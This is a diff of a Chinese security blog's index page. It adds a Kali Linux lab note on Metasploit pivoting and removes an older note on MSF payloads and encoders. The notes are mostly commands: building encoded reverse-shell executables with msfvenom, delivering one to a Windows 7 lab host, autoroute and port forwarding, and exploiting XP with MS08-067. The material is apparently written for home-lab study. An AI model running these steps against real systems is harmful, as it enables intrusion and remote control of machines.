@@ -240,6 +240,369 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Pivoting%E9%9A%A7%E9%81%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Pivoting%E9%9A%A7%E9%81%93/" itemprop="url">Kali Linux笔记(一百一十)：MSF后渗透测试--Pivoting隧道</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T00:18:58+08:00">
+                2020-03-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-Pivoting跳板-枢纽-支点"><a href="#1-Pivoting跳板-枢纽-支点" class="headerlink" title="1. Pivoting跳板 / 枢纽 / 支点"></a>1. Pivoting跳板 / 枢纽 / 支点</h4><ul>
+<li>利用已经控制的一台计算机作为入侵内网的跳板</li>
+<li>在其他内网计算机看来访问全部来自于跳板机</li>
+<li><strong><code>🔺命令：run autoroute -s 1.1.1.0/24</code></strong>  #不能访问外网的被攻击目标内网网段<ul>
+<li>▲ 再深一层的内网，也可以使用，比如Window 7双网卡，第一块网卡接防火墙，第二块网卡接更深一层的私网，且不可路由</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-实验–Pivoting自动路由"><a href="#2-实验–Pivoting自动路由" class="headerlink" title="2. 实验–Pivoting自动路由"></a>2. 实验–Pivoting自动路由</h4><ul>
+<li>Mono 1<ul>
+<li>网卡1模式为Host-only-2模式，检查网络</li>
+<li>网卡2模式为Bridge模式，检查网络</li>
+<li>LAN → 1.1.1.1 WAN → 192.168.0.110</li>
+</ul>
+</li>
+<li>Mono 2<ul>
+<li>网卡1模式为Host-only-3模式，检查网络</li>
+<li>网卡2模式为Bridge模式，检查网络</li>
+<li>2 set up A LAN Address<ul>
+<li>2.1.1.1</li>
+<li>24</li>
+<li>dhcp</li>
+<li>2.1.1.10</li>
+<li>2.1.1.100</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡模式为Host-only-2模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li>浏览器访问mono 1<ul>
+<li>Rules → WAN → LAN -&gt; Any</li>
+<li>NAT → Inbound → <ul>
+<li>External port range → from/to other4444</li>
+<li>NAT IP → Kali的IP</li>
+<li>Local port → other 4444</li>
+<li>Auto-add a firewall rule to permit traffic through this NAT rule → Apply</li>
+</ul>
+</li>
+<li>查看Rules → WAN是否添加规则正常</li>
+<li>NAT → Inbound → <ul>
+<li>External port range → from/to other80</li>
+<li>NAT IP → Kali的IP</li>
+<li>Local port → other 80</li>
+<li>Auto-add a firewall rule to permit traffic through this NAT rule → Apply</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：service apache2 start</code></strong></li>
+<li>物理主机访问mono 1的Brige模式的IP，是否能看到Kali开启的Web服务</li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li>网卡模式为Host-only-3模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li>浏览器访问mono 2<ul>
+<li>Rules → LAN → LAN -&gt; ANY<ul>
+<li>Action → Pass</li>
+<li>Interface → LAN</li>
+<li>Sourece → LAN subnet</li>
+<li>save</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>浏览器访问百度尝试</li>
+<li>关闭Window 7的UAC验证</li>
+<li>重启电脑</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：msfvenom -p windows/meterpreter/reverse_tcp LHOST=mono 1的Brige模式下的IP地址 LPORT=4444 -a x86 --platform windows -b &#39;\x00\xff&#39; -e x86/shikata_ga -f exe a.exe</code></strong></li>
+<li><strong><code>🔺命令：cp a.exe /var/www/html</code></strong></li>
+<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
+<li><strong><code>🔺命令：use exploit/multi/handle</code></strong><ul>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP地址</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li>浏览器访问<a href="http://mono" target="_blank" rel="noopener">http://mono</a> 1的Brige模式下的IP地址/a.exe，下载a.exe</li>
+<li>执行a.exe</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看是否拿到shell</li>
+<li>**`🔺命令：getuid</li>
+<li><strong><code>🔺命令：run autoroute -s 2.1.1.0/24</code></strong></li>
+<li><strong><code>🔺命令：run autoroute -p</code></strong> 查看路由表</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-自动路由显示场景"><a href="#3-自动路由显示场景" class="headerlink" title="3. 自动路由显示场景"></a>3. 自动路由显示场景</h4><ul>
+<li>利用win 7攻击内网XP（对比XP有无外网访问权的情况）</li>
+<li>扫描内网：<strong><code>🔺命令：use auxiliary/scanner/portscan/tcp</code></strong></li>
+<li>实验环境准备<ul>
+<li>Window XP SP3 <ul>
+<li>网卡模式为Host-only-3模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址，关闭防火墙</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-实验–攻击内网其他主机"><a href="#4-实验–攻击内网其他主机" class="headerlink" title="4. 实验–攻击内网其他主机"></a>4. 实验–攻击内网其他主机</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
+<li><strong><code>🔺命令：use auxiliary/scanner/portscan/tcp</code></strong><ul>
+<li><strong><code>🔺命令：set RHOSTS 2.1.1.9-2.1.1.12</code></strong></li>
+<li><strong><code>🔺命令：set PORTS 139,445</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+<li><strong><code>🔺命令：db_nmap -sV -p445 -A -Pn Window XP SP3的IP</code></strong></li>
+<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
+<li><strong><code>🔺命令：set RHOST Window XP SP3的IP</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Window 7的IP</code></strong></li>
+</ul>
+</li>
+<li><strong><code>🔺命令：set target 34</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+<li>win 7若开启防火墙，可能要通过之前的shell来添加访问规则</li>
+<li>查看是否拿到shell</li>
+<li><strong><code>🔺命令：getuid</code></strong></li>
+<li><strong><code>🔺命令：background</code></strong></li>
+<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
+<li><strong><code>🔺命令：set RHOST Window XP SP3的IP</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST mono的IP</code></strong></li>
+</ul>
+</li>
+<li><strong><code>🔺命令：set target 34</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+<li>查看是否拿到shell</li>
+<li>删除路由</li>
+<li><strong><code>🔺命令：session -i 1</code></strong><ul>
+<li><strong><code>🔺命令：run autoroute -h</code></strong></li>
+<li><strong><code>🔺命令：run autoroute -d -s 2.1.1.0/24</code></strong><ul>
+<li>-s：增加路由记录</li>
+<li>-d -s：删除路由记录</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：run autoroute -p</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=cde4WOBGkE-67B7-t8x-uUPvvcCMsAeX3Dr5Afm8UK9FyB5CvLHNttNiQyVEIFWDrVNP0WqaMCYTlsb6QNBnBUbX67mNGWeyEfaCEFEsVt_oWPp-Yt9g11EeV20nAFs3GZ1L7jM&file_name=/Pivoting%E8%87%AA%E5%8A%A8%E8%B7%AF%E7%94%B1.png" alt="Pivoting自动路由"></p>
+<h4 id="5-Pivoting端口转发–Portfwd"><a href="#5-Pivoting端口转发–Portfwd" class="headerlink" title="5.  Pivoting端口转发–Portfwd"></a>5.  Pivoting端口转发–Portfwd</h4><ul>
+<li>利用已经被控计算机，在Kali与攻击目标之间实现端口转发</li>
+<li><strong><code>🔺命令：portfwd add -L LIP -l LPORT -r RIP -p RPORT</code></strong></li>
+<li><strong><code>🔺命令：portfwd add -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389</code></strong> </li>
+<li><strong><code>🔺命令：portfwd list  /  delete  /  flush</code></strong> </li>
+</ul>
+<h4 id="6-实验–Portfwd"><a href="#6-实验–Portfwd" class="headerlink" title="6. 实验–Portfwd"></a>6. 实验–Portfwd</h4><ul>
+<li>Window XP SP3<ul>
+<li>开启远程桌面</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>在上述实验Kali与Window 7建立的session的基础上</li>
+<li><strong><code>🔺命令：session -i 1</code></strong><ul>
+<li><strong><code>🔺命令：portfwd</code></strong></li>
+<li><strong><code>🔺命令：portfwd add -L Kali的IP -l 3389 -r Window XP的IP -p 3389</code></strong></li>
+<li><strong><code>🔺命令：portfwd list</code></strong>（Kali的IP）</li>
+<li><strong><code>🔺命令：portfwd add -l 4489 -r Window XP的IP -p 3389</code></strong></li>
+<li><strong><code>🔺命令：protfwd list</code></strong>（0.0.0.0）</li>
+</ul>
+</li>
+<li>rdesktop Kali的IP的IP查看是否能开启远程桌面</li>
+<li><strong><code>🔺命令：rdesktop 127.0.0.1:4489</code></strong>查看是否能开启远程桌面</li>
+<li><strong><code>🔺命令：session -i 1</code></strong><ul>
+<li>删除所有链接：<strong><code>🔺命令：portfwd flush</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/IPS%E7%AC%94%E8%AE%B0-2%EF%BC%9AIPS%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -3776,219 +4139,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%BA%8C)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Payload%E3%80%81Encoders/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%BA%8C)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Payload%E3%80%81Encoders/" itemprop="url">Kali Linux笔记(一百零二)：MSF模块--Payload、Encoders</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-26T23:20:54+08:00">
-                2020-02-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  377 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-payload模块和encoders模块"><a href="#1-payload模块和encoders模块" class="headerlink" title="1. payload模块和encoders模块"></a>1. payload模块和encoders模块</h4><ul>
-<li><strong><code>🔺命令：use payload/windows/shell_bind_tcp</code></strong><ul>
-<li>▲ 默认情况下Ruby语言的shellcode</li>
-<li>RHOST：用于限制来源IP，非发送IP </li>
-<li><strong><code>🔺命令：generate</code></strong>（坏字符）</li>
-</ul>
-</li>
-<li>msf自动选择编码绕过坏字符<ul>
-<li><strong><code>🔺命令：show encodes</code></strong>：查看可进行编码的模块</li>
-<li><strong><code>🔺命令：generate -b &#39;\x00&#39;</code></strong> </li>
-<li><strong><code>🔺命令：generate -b &#39;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b&#39;</code></strong> </li>
-<li><strong><code>🔺命令：generate -b &#39;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b \xFF\x0a\x0b\x01\xcc\6e\x1e\x2e\x26&#39;</code></strong>（过滤字符过多，可能没有编码方式）</li>
-</ul>
-</li>
-<li>手动指定编码模块<ul>
-<li>参数<ul>
-<li>-t：输出格式（可以使用C/python/java，generate -t c/python/java，默认为Ruby）▲ 2020.2.26 无-t操作，输出格式为-f</li>
-<li>-i：加密的轮数</li>
-<li>-k：不产生新的进程</li>
-<li>-x：使用的程序模板  </li>
-<li>-f：输出文件（包括路径）▲ 2020.2.26 -f操作为-o，-f为输出格式</li>
-<li>-n：NOP sled length（无操作的长度） ▲ 2020.2.26 -s操作修改为-n</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：generate -e x86/nonalpha</code></strong></li>
-<li><strong><code>🔺命令：generate -b &#39;\x00&#39; -f exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -o /root/1.exe</code></strong></li>
-<li>压缩1.exe为1.zip</li>
-<li><strong><code>🔺命令：cp 1.exe /mnt/hgfs/share</code></strong></li>
-<li>拷贝到win7的电脑端并解压</li>
-<li>win7双击启动，<strong><code>🔺命令：netstat -nao | findstr &quot;4444&quot;</code></strong>（看是否开启端口）</li>
-<li><strong><code>🔺命令：kali nc win7的IP 4444</code></strong></li>
-</ul>
-</li>
-<li>▲ NOP：no-operation / Next Operation（无任何操作）<ul>
-<li>EIP返回到存储NOP sled的任意地址时将递增，最终导致shellcode执行</li>
-<li><strong><code>🔺命令：generate -n 14</code></strong></li>
-<li>比较有无NOP sled的payload的size长度</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -4043,7 +4193,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">148</span>
+                  <span class="site-state-item-count">149</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -4150,7 +4300,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">133.4k</span>
+    <span title="Site words total count">134k</span>
   
 </div>
 
